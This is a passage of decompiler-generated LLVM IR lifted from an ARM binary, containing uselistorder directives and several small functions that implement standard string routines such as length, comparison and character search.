  uselistorder i32* %r2.global-to-local, { 0, 69, 1, 2, 3, 4, 5, 70, 6, 7, 8, 9, 10, 71, 11, 12, 67, 68, 72, 28, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 29, 30, 62, 31, 32, 33, 34, 35, 63, 36, 37, 38, 39, 40, 64, 41, 42, 43, 44, 45, 65, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 56, 2, 4, 6, 8, 5, 57, 7, 9, 11, 54, 10, 58, 53, 55, 59, 62, 60, 66, 67, 12, 13, 14, 16, 15, 17, 18, 61, 19, 20, 63, 21, 64, 22, 65, 23, 24, 25, 26, 27, 30, 28, 40, 29, 31, 34, 32, 41, 33, 35, 38, 36, 42, 37, 39, 43, 44, 47, 45, 48, 46, 49, 50, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 28, 1, 2, 29, 3, 4, 30, 5, 27, 33, 34, 6, 7, 19, 8, 10, 9, 11, 12, 31, 13, 14, 32, 15, 16, 17, 18, 20, 21, 23, 22, 24, 25, 26 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 7, 4, 9, 3, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 21, 22, 23, 0, 24, 5, 25, 6, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 2, 7, 4, 9, 3, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 22, 0, 23, 5, 24, 6, 26, 25, 27, 29, 28, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 2, 7, 4, 9, 3, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 22, 23, 24, 0, 25, 5, 26, 6, 28, 27, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -3, { 0, 4, 6, 3, 1, 2, 5 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 15, { 12, 13, 14, 0, 21, 1, 23, 15, 16, 3, 17, 22, 4, 5, 6, 7, 8, 9, 10, 18, 11, 19, 2, 20 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 30, 2, 4, 5, 3, 6, 7, 8, 9, 15, 35, 40, 38, 39, 37, 31, 32, 21, 22, 33, 34, 36, 23, 24, 25, 26, 18, 27, 16, 17, 11, 12, 13, 10, 14, 19, 20, 28, 29, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 11, { 12, 13, 14, 19, 25, 30, 2, 15, 3, 16, 4, 17, 26, 27, 28, 0, 5, 6, 7, 18, 20, 21, 8, 22, 9, 23, 1, 24, 29, 10, 31, 32, 33, 11, 34 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 3, 5, 4, 23 }
  uselistorder i32 48, { 0, 2, 4, 15, 3, 5, 6, 17, 18, 11, 12, 13, 14, 24, 25, 26, 19, 27, 7, 16, 20, 1, 8, 21, 9, 22, 10, 23 }
  uselistorder i32 40, { 2, 12, 13, 3, 1, 6, 5, 23, 14, 7, 15, 16, 17, 4, 18, 19, 0, 20, 22, 21, 9, 24, 10, 25, 8, 26, 11, 27 }
  uselistorder i32 36, { 4, 22, 6, 7, 8, 23, 9, 20, 10, 21, 11, 12, 13, 0, 1, 14, 2, 15, 3, 16, 17, 5, 24, 18, 25, 19, 26 }
  uselistorder i32 -16, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
  uselistorder i32 31, { 4, 5, 10, 9, 0, 1, 6, 2, 7, 3, 8 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 24, { 0, 59, 60, 61, 62, 8, 9, 10, 12, 11, 13, 1, 14, 63, 64, 65, 15, 66, 16, 17, 67, 18, 58, 86, 87, 54, 55, 56, 57, 19, 20, 21, 22, 99, 100, 23, 109, 24, 2, 25, 88, 89, 26, 90, 51, 52, 27, 68, 82, 101, 102, 83, 69, 70, 71, 72, 73, 74, 75, 76, 77, 28, 78, 29, 79, 30, 80, 81, 84, 85, 103, 104, 105, 106, 31, 32, 33, 34, 35, 91, 36, 37, 3, 38, 39, 40, 4, 41, 42, 43, 5, 92, 44, 93, 94, 95, 96, 45, 46, 6, 97, 47, 98, 48, 107, 49, 108, 7, 53, 50, 110 }
  uselistorder i32 27, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32* @lr, { 180, 181, 182, 183, 184, 185, 186, 187, 188, 4, 5, 6, 7, 8, 9, 10, 11, 12, 3, 119, 120, 32, 189, 190, 13, 14, 121, 122, 123, 124, 125, 126, 103, 104, 105, 127, 140, 141, 128, 129, 130, 131, 132, 133, 134, 2, 135, 136, 138, 139, 137, 39, 40, 41, 42, 43, 44, 142, 143, 144, 145, 116, 146, 106, 15, 107, 108, 109, 110, 0, 114, 115, 111, 112, 113, 19, 20, 21, 22, 23, 24, 25, 27, 26, 1, 28, 29, 30, 31, 16, 17, 18, 33, 34, 35, 36, 37, 38, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 147, 148, 149, 117, 118, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179 }
  uselistorder label %dec_label_pc_17b70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17b04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17a98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17a38, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_179c4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_17988, { 1, 0 }
  uselistorder label %dec_label_pc_17974, { 1, 0 }
  uselistorder label %dec_label_pc_17934, { 2, 0, 1 }
  uselistorder label %dec_label_pc_178c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1785c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_177fc, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_177cc, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_17768, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_17728, { 1, 0 }
}

define i32 @function_17b90(i32 %arg1) local_unnamed_addr {
dec_label_pc_17b90:
  %v1_17b90 = and i32 %arg1, -4
  %v1_17b94 = inttoptr i32 %v1_17b90 to i32*
  %v2_17b94 = load i32, i32* %v1_17b94, align 4
  %v1_17b98 = urem i32 %arg1, 4
  store i32 %v1_17b98, i32* @r3, align 4
  %v2_17b98 = icmp eq i32 %v1_17b98, 0
  %v1_17b9c = sub nsw i32 0, %v1_17b98
  br i1 %v2_17b98, label %.preheader.preheader, label %dec_label_pc_17ba4

dec_label_pc_17ba4:                               ; preds = %dec_label_pc_17b90
  %v1_17ba4 = or i32 %v2_17b94, 255
  %v7_17ba8 = icmp eq i32 %v1_17b98, 1
  br i1 %v7_17ba8, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_17ba4
  %v9_17bac = or i32 %v2_17b94, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_17ba4, %bb
  %v8_17bb4 = phi i32 [ %v1_17ba4, %dec_label_pc_17ba4 ], [ %v9_17bac, %bb ]
  %v1_17bb0 = add nsw i32 %v1_17b98, -2
  store i32 %v1_17bb0, i32* @r3, align 4
  %v7_17bb4 = icmp eq i32 %v1_17b98, 3
  br i1 %v7_17bb4, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_17bb4 = or i32 %v8_17bb4, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_17b90
  %v1_17bc4.ph = phi i32 [ %v2_17b94, %dec_label_pc_17b90 ], [ %v9_17bb4, %bb34 ], [ %v8_17bb4, %bb33 ]
  %v1_17bb838 = urem i32 %v1_17bc4.ph, 256
  %v2_17bb839 = icmp eq i32 %v1_17bb838, 0
  %v2_17bbc40 = and i32 %v1_17bc4.ph, 65280
  %v3_17bbc41 = icmp eq i32 %v2_17bbc40, 0
  %or.cond42 = or i1 %v2_17bb839, %v3_17bbc41
  %v2_17bc043 = and i32 %v1_17bc4.ph, 16711680
  %v3_17bc044 = icmp eq i32 %v2_17bc043, 0
  %or.cond3145 = or i1 %v3_17bc044, %or.cond42
  %v4_17bc446 = icmp ult i32 %v1_17bc4.ph, 16777216
  %or.cond3247 = or i1 %v4_17bc446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_17bd4, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_17bc81349 = phi i32 [ %v2_17bc814, %.thread4 ], [ %v1_17b9c, %.preheader.preheader ]
  %v1_17bcc48.in = phi i32 [ %v1_17bcc48, %.thread4 ], [ %v1_17b90, %.preheader.preheader ]
  %v1_17bcc48 = add i32 %v1_17bcc48.in, 4
  %v2_17bc814 = add i32 %v1_17bc81349, 4
  %v2_17bcc = inttoptr i32 %v1_17bcc48 to i32*
  %v3_17bcc = load i32, i32* %v2_17bcc, align 4
  %v1_17bb8 = urem i32 %v3_17bcc, 256
  %v2_17bb8 = icmp eq i32 %v1_17bb8, 0
  %v2_17bbc = and i32 %v3_17bcc, 65280
  %v3_17bbc = icmp eq i32 %v2_17bbc, 0
  %or.cond = or i1 %v2_17bb8, %v3_17bbc
  %v2_17bc0 = and i32 %v3_17bcc, 16711680
  %v3_17bc0 = icmp eq i32 %v2_17bc0, 0
  %or.cond31 = or i1 %v3_17bc0, %or.cond
  %v4_17bc4 = icmp ult i32 %v3_17bcc, 16777216
  %or.cond32 = or i1 %v4_17bc4, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_17bd4, label %.thread4

dec_label_pc_17bd4:                               ; preds = %.thread4, %.preheader.preheader
  %v1_17bc813.lcssa = phi i32 [ %v1_17b9c, %.preheader.preheader ], [ %v2_17bc814, %.thread4 ]
  %v2_17bb8.lcssa = phi i1 [ %v2_17bb839, %.preheader.preheader ], [ %v2_17bb8, %.thread4 ]
  %v3_17bbc.lcssa = phi i1 [ %v3_17bbc41, %.preheader.preheader ], [ %v3_17bbc, %.thread4 ]
  %v3_17bc0.lcssa = phi i1 [ %v3_17bc044, %.preheader.preheader ], [ %v3_17bc0, %.thread4 ]
  br i1 %v2_17bb8.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_17bd4
  %v2_17bd8 = add i32 %v1_17bc813.lcssa, 1
  br i1 %v3_17bbc.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_17be017 = add i32 %v1_17bc813.lcssa, 2
  br i1 %v3_17bc0.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_17be8 = add i32 %v1_17bc813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_17bd4, %bb35, %bb36, %bb37
  %v1_17bec = phi i32 [ %v2_17bd8, %bb35 ], [ %v2_17be017, %bb36 ], [ %v2_17be8, %bb37 ], [ %v1_17bc813.lcssa, %dec_label_pc_17bd4 ]
  ret i32 %v1_17bec

; uselistorder directives
  uselistorder i32 %v1_17bc813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_17bcc, { 3, 2, 1, 0 }
  uselistorder i32 %v1_17bc4.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_17b98, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 -2, { 1, 3, 4, 2, 12, 13, 14, 0, 5, 15, 31, 30, 32, 33, 34, 23, 24, 25, 26, 27, 28, 29, 16, 17, 18, 19, 20, 21, 22, 11, 10, 9, 8, 7, 6 }
  uselistorder i32 65535, { 2, 94, 95, 0, 1, 10, 11, 3, 4, 23, 22, 26, 49, 25, 50, 12, 13, 5, 27, 51, 28, 52, 53, 14, 54, 24, 29, 55, 30, 56, 31, 57, 58, 59, 32, 60, 61, 15, 62, 6, 36, 63, 35, 64, 33, 65, 34, 66, 67, 16, 68, 7, 69, 70, 40, 71, 39, 72, 37, 73, 38, 74, 18, 17, 75, 76, 41, 77, 42, 78, 79, 80, 19, 81, 82, 8, 43, 83, 44, 84, 45, 85, 86, 87, 20, 88, 89, 9, 48, 90, 46, 91, 47, 92, 21, 93 }
  uselistorder i32 -4, { 42, 18, 63, 64, 65, 6, 19, 20, 21, 66, 67, 68, 7, 22, 23, 24, 69, 70, 71, 8, 25, 26, 72, 17, 16, 73, 74, 75, 15, 14, 13, 12, 27, 28, 29, 30, 31, 5, 32, 3, 33, 4, 76, 11, 34, 50, 51, 52, 9, 53, 54, 55, 35, 49, 2, 36, 43, 44, 45, 46, 47, 48, 0, 1, 56, 57, 58, 59, 60, 61, 62, 37, 39, 40, 41, 10, 38 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_17bf0(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_17bf4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_17bf0

dec_label_pc_17bf0:                               ; preds = %bb3, %bb
  %v0_17bf4 = phi i32 [ %v0_17bf4.pre, %bb ], [ %v5_17bf4, %bb3 ]
  %v0_17bf0 = phi i32 [ %tmp, %bb ], [ %v5_17bf0, %bb3 ]
  %v1_17bf0 = inttoptr i32 %v0_17bf0 to i8*
  %v2_17bf0 = load i8, i8* %v1_17bf0, align 1
  %v1_17bf4 = inttoptr i32 %v0_17bf4 to i8*
  %v2_17bf4 = load i8, i8* %v1_17bf4, align 1
  %v3_17bf4 = zext i8 %v2_17bf4 to i32
  %v2_17bf8 = icmp eq i8 %v2_17bf0, 0
  br i1 %v2_17bf8, label %.dec_label_pc_17c04_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_17bf0
  %v5_17bf4 = add i32 %v0_17bf4, 1
  %v5_17bf0 = add i32 %v0_17bf0, 1
  %v3_17bf0 = zext i8 %v2_17bf0 to i32
  %v10_17bfc = icmp eq i8 %v2_17bf0, %v2_17bf4
  br i1 %v10_17bfc, label %dec_label_pc_17bf0, label %dec_label_pc_17c04

.dec_label_pc_17c04_crit_edge:                    ; preds = %dec_label_pc_17bf0
  br label %dec_label_pc_17c04

dec_label_pc_17c04:                               ; preds = %bb3, %.dec_label_pc_17c04_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_17c04_crit_edge ], [ %v3_17bf0, %bb3 ]
  %v2_17c04.pre-phi = sub nsw i32 %.pn, %v3_17bf4
  ret i32 %v2_17c04.pre-phi

; uselistorder directives
  uselistorder i8 %v2_17bf0, { 0, 2, 1 }
  uselistorder i32 %v0_17bf0, { 1, 0 }
  uselistorder i32 %v0_17bf4, { 1, 0 }
  uselistorder label %dec_label_pc_17c04, { 1, 0 }
}

define i32 @function_17c10() local_unnamed_addr {
dec_label_pc_17c10:
  %stack_var_-16 = alloca i32, align 4
  %v3_17c10 = load i32, i32* @r4, align 4
  store i32 %v3_17c10, i32* %stack_var_-16, align 4
  %v6_17c10 = load i32, i32* @r5, align 4
  %v9_17c10 = load i32, i32* @r6, align 4
  %v0_17c14 = load i32, i32* @r0, align 4
  %v0_17c18 = load i32, i32* @r1, align 4
  store i32 %v0_17c18, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_17c348 = inttoptr i32 %v0_17c14 to i8*
  %v2_17c349 = load i8, i8* %v1_17c348, align 1
  %v2_17c3811 = icmp eq i8 %v2_17c349, 0
  store i32 %v0_17c18, i32* @r0, align 4
  %v1_17c4012 = add i32 %v0_17c14, 1
  store i32 %v1_17c4012, i32* @r4, align 4
  br i1 %v2_17c3811, label %dec_label_pc_17c48, label %dec_label_pc_17c24

dec_label_pc_17c24:                               ; preds = %dec_label_pc_17c10, %dec_label_pc_17c30
  %v3_17c3414.in = phi i8 [ %v2_17c34, %dec_label_pc_17c30 ], [ %v2_17c349, %dec_label_pc_17c10 ]
  %v0_17c3c13 = phi i32 [ %v0_17c3c.pre, %dec_label_pc_17c30 ], [ %v0_17c18, %dec_label_pc_17c10 ]
  %v3_17c3414 = zext i8 %v3_17c3414.in to i32
  %v2_17c24 = call i32 @function_17ddc(i32 %v0_17c3c13, i32 %v3_17c3414)
  %v2_17c28 = icmp eq i32 %v2_17c24, 0
  %v0_17c30 = load i32, i32* @r5, align 4
  br i1 %v2_17c28, label %dec_label_pc_17c30, label %dec_label_pc_17c48

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17c24
  %v1_17c30 = add i32 %v0_17c30, 1
  %v0_17c34.pre = load i32, i32* @r4, align 4
  %v0_17c3c.pre = load i32, i32* @r6, align 4
  store i32 %v1_17c30, i32* @r5, align 4
  %v1_17c34 = inttoptr i32 %v0_17c34.pre to i8*
  %v2_17c34 = load i8, i8* %v1_17c34, align 1
  %v2_17c38 = icmp eq i8 %v2_17c34, 0
  store i32 %v0_17c3c.pre, i32* @r0, align 4
  %v1_17c40 = add i32 %v0_17c34.pre, 1
  store i32 %v1_17c40, i32* @r4, align 4
  br i1 %v2_17c38, label %dec_label_pc_17c48, label %dec_label_pc_17c24

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17c30, %dec_label_pc_17c24, %dec_label_pc_17c10
  %v0_17c48 = phi i32 [ 0, %dec_label_pc_17c10 ], [ %v0_17c30, %dec_label_pc_17c24 ], [ %v1_17c30, %dec_label_pc_17c30 ]
  %v2_17c4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17c4c, i32* @r4, align 4
  store i32 %v6_17c10, i32* @r5, align 4
  store i32 %v9_17c10, i32* @r6, align 4
  ret i32 %v0_17c48

; uselistorder directives
  uselistorder i8 %v2_17c34, { 1, 0 }
  uselistorder i32 %v0_17c3c.pre, { 1, 0 }
  uselistorder i32 %v0_17c34.pre, { 1, 0 }
  uselistorder i32* @r6, { 33, 2, 34, 35, 3, 36, 37, 38, 4, 39, 40, 28, 29, 41, 42, 5, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 6, 7, 60, 61, 62, 63, 64, 65, 66, 67, 30, 31, 32, 8, 9, 10, 479, 480, 481, 482, 483, 484, 485, 68, 11, 69, 12, 70, 477, 478, 366, 370, 371, 372, 373, 367, 368, 369, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 374, 399, 400, 401, 375, 376, 377, 378, 379, 13, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 395, 397, 391, 392, 393, 394, 396, 398, 144, 145, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 130, 325, 326, 327, 328, 329, 330, 331, 131, 107, 332, 132, 133, 134, 135, 136, 111, 112, 128, 129, 108, 109, 110, 15, 14, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 137, 138, 139, 140, 141, 142, 143, 333, 334, 335, 1, 0, 336, 337, 338, 339, 340, 341, 342, 23, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 151, 152, 16, 153, 154, 155, 156, 157, 158, 159, 160, 146, 147, 148, 149, 150, 161, 162, 163, 164, 165, 166, 167, 168, 169, 17, 170, 171, 172, 173, 174, 175, 189, 190, 191, 192, 24, 193, 194, 195, 18, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 27, 19, 234, 235, 237, 238, 236, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 20, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 26, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 25, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 21, 22, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476 }
  uselistorder label %dec_label_pc_17c24, { 1, 0 }
}

define i32 @function_17c54(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17c54:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_17c842 = load i32, i32* @r0, align 4
  %v1_17c843 = inttoptr i32 %v0_17c842 to i8*
  %v2_17c844 = load i8, i8* %v1_17c843, align 1
  %v3_17c845 = zext i8 %v2_17c844 to i32
  store i32 %v3_17c845, i32* @ip, align 4
  %v2_17c886 = icmp eq i8 %v2_17c844, 0
  br i1 %v2_17c886, label %dec_label_pc_17c94, label %dec_label_pc_17c68.preheader

dec_label_pc_17c60:                               ; preds = %dec_label_pc_17c68
  %v3_17c68 = zext i8 %v2_17c68 to i32
  %v1_17c70 = add i32 %v0_17c70, 1
  %v9_17c60 = icmp eq i32 %v0_17c6010, %v3_17c68
  br i1 %v9_17c60, label %dec_label_pc_17c7c, label %dec_label_pc_17c68

dec_label_pc_17c68:                               ; preds = %dec_label_pc_17c68.preheader, %dec_label_pc_17c60
  %v0_17c70 = phi i32 [ %tmp, %dec_label_pc_17c68.preheader ], [ %v1_17c70, %dec_label_pc_17c60 ]
  %v1_17c68 = inttoptr i32 %v0_17c70 to i8*
  %v2_17c68 = load i8, i8* %v1_17c68, align 1
  %v2_17c6c = icmp eq i8 %v2_17c68, 0
  br i1 %v2_17c6c, label %dec_label_pc_17c94, label %dec_label_pc_17c60

dec_label_pc_17c7c:                               ; preds = %dec_label_pc_17c60
  %v1_17c7c = add i32 %v0_17c7c, 1
  %v1_17c80 = add i32 %v0_17c80, 1
  %v1_17c84 = inttoptr i32 %v1_17c80 to i8*
  %v2_17c84 = load i8, i8* %v1_17c84, align 1
  %v3_17c84 = zext i8 %v2_17c84 to i32
  store i32 %v3_17c84, i32* @ip, align 4
  %v2_17c88 = icmp eq i8 %v2_17c84, 0
  br i1 %v2_17c88, label %dec_label_pc_17c94, label %dec_label_pc_17c68.preheader

dec_label_pc_17c68.preheader:                     ; preds = %dec_label_pc_17c54, %dec_label_pc_17c7c
  %v0_17c80 = phi i32 [ %v1_17c80, %dec_label_pc_17c7c ], [ %v0_17c842, %dec_label_pc_17c54 ]
  %v0_17c7c = phi i32 [ %v1_17c7c, %dec_label_pc_17c7c ], [ 0, %dec_label_pc_17c54 ]
  %v0_17c6010 = phi i32 [ %v3_17c84, %dec_label_pc_17c7c ], [ %v3_17c845, %dec_label_pc_17c54 ]
  br label %dec_label_pc_17c68

dec_label_pc_17c94:                               ; preds = %dec_label_pc_17c7c, %dec_label_pc_17c68, %dec_label_pc_17c54
  %v0_17c94 = phi i32 [ 0, %dec_label_pc_17c54 ], [ %v0_17c7c, %dec_label_pc_17c68 ], [ %v1_17c7c, %dec_label_pc_17c7c ]
  ret i32 %v0_17c94

; uselistorder directives
  uselistorder i32 %v0_17c70, { 1, 0 }
  uselistorder label %dec_label_pc_17c68.preheader, { 1, 0 }
}

define i32 @function_17ca0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17ca0:
  store i32 %arg1, i32* @r0, align 4
  %v1_17ca4 = urem i32 %arg2, 256
  store i32 %v1_17ca4, i32* @r4, align 4
  %v2_17ca4 = icmp eq i32 %v1_17ca4, 0
  br i1 %v2_17ca4, label %dec_label_pc_17cb8, label %dec_label_pc_17ccc.preheader

dec_label_pc_17ccc.preheader:                     ; preds = %dec_label_pc_17ca0
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_17cd43 = call i32 @function_17ddc(i32 %arg1, i32 %v1_17ca4)
  %v2_17cd85 = icmp eq i32 %v2_17cd43, 0
  br i1 %v2_17cd85, label %dec_label_pc_17ce0, label %dec_label_pc_17cc4

dec_label_pc_17cb8:                               ; preds = %dec_label_pc_17ca0
  %v2_17cbc = call i32 @function_17ddc(i32 %arg1, i32 0)
  br label %dec_label_pc_17ce4

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17ccc.preheader, %dec_label_pc_17cc4
  %v2_17cd46 = phi i32 [ %v2_17cd4, %dec_label_pc_17cc4 ], [ %v2_17cd43, %dec_label_pc_17ccc.preheader ]
  store i32 %v2_17cd46, i32* @r5, align 4
  %v1_17cc8 = add i32 %v2_17cd46, 1
  store i32 %v1_17cc8, i32* @r0, align 4
  %v0_17cd0 = load i32, i32* @r4, align 4
  %v2_17cd4 = call i32 @function_17ddc(i32 %v1_17cc8, i32 %v0_17cd0)
  %v2_17cd8 = icmp eq i32 %v2_17cd4, 0
  br i1 %v2_17cd8, label %dec_label_pc_17ce0, label %dec_label_pc_17cc4

dec_label_pc_17ce0:                               ; preds = %dec_label_pc_17cc4, %dec_label_pc_17ccc.preheader
  %v0_17ce0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_17ce4

dec_label_pc_17ce4:                               ; preds = %dec_label_pc_17cb8, %dec_label_pc_17ce0
  %storemerge = phi i32 [ %v2_17cbc, %dec_label_pc_17cb8 ], [ %v0_17ce0, %dec_label_pc_17ce0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_17cd4, { 1, 0 }
  uselistorder i32 %v1_17cc8, { 1, 0 }
  uselistorder i32 %v1_17ca4, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_17ddc, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17ce4, { 1, 0 }
  uselistorder label %dec_label_pc_17cc4, { 1, 0 }
}

define i32 @function_17cf0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17cf0:
  %v1_17cf4 = urem i32 %arg1, 256
  %v0_17d142 = load i32, i32* @r0, align 4
  %v1_17d143 = urem i32 %v0_17d142, 4
  %v2_17d144 = icmp eq i32 %v1_17d143, 0
  br i1 %v2_17d144, label %dec_label_pc_17d1c, label %dec_label_pc_17cfc

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17cf0, %dec_label_pc_17d10
  %v0_17d10 = phi i32 [ %v1_17d10, %dec_label_pc_17d10 ], [ %v0_17d142, %dec_label_pc_17cf0 ]
  %v1_17cfc = inttoptr i32 %v0_17d10 to i8*
  %v2_17cfc = load i8, i8* %v1_17cfc, align 1
  %v3_17cfc = zext i8 %v2_17cfc to i32
  %v9_17d00 = icmp eq i32 %v3_17cfc, %v1_17cf4
  br i1 %v9_17d00, label %dec_label_pc_17dcc, label %dec_label_pc_17d08

dec_label_pc_17d08:                               ; preds = %dec_label_pc_17cfc
  %v2_17d08 = icmp eq i8 %v2_17cfc, 0
  br i1 %v2_17d08, label %dec_label_pc_17dcc, label %dec_label_pc_17d10

dec_label_pc_17d10:                               ; preds = %dec_label_pc_17d08
  %v1_17d10 = add i32 %v0_17d10, 1
  %v1_17d14 = urem i32 %v1_17d10, 4
  %v2_17d14 = icmp eq i32 %v1_17d14, 0
  br i1 %v2_17d14, label %dec_label_pc_17d1c, label %dec_label_pc_17cfc

